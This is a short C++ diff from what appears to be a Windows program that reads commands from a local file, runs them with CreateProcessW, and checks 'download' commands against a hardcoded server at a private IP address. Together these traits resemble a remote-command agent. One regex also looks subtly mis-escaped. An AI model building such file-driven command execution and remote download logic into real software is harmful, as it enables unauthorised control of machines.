@@ -54,7 +54,7 @@ bool IsDownloadCommand(const std::wstring& command) {
         L"http://192.168.145.140:8080/updates/",
     };
 
-    std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");
+    std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");;
     std::wsmatch matches;
 
     // Match the command with the regex pattern
@@ -131,12 +131,12 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
         std::wcout << L"Command from File: " << command << std::endl;
 
         if (command != tempCommand) {
+            IsDownloadCommand(command);  // Check if the command is a download command
+
             // Prepare to execute the command
             STARTUPINFO si = { 0 };
             PROCESS_INFORMATION pi = { 0 };
             si.cb = sizeof(si);
-
-   			IsDownloadCommand(command);  // Check if the command is a download command
 
             // Create the process
             BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
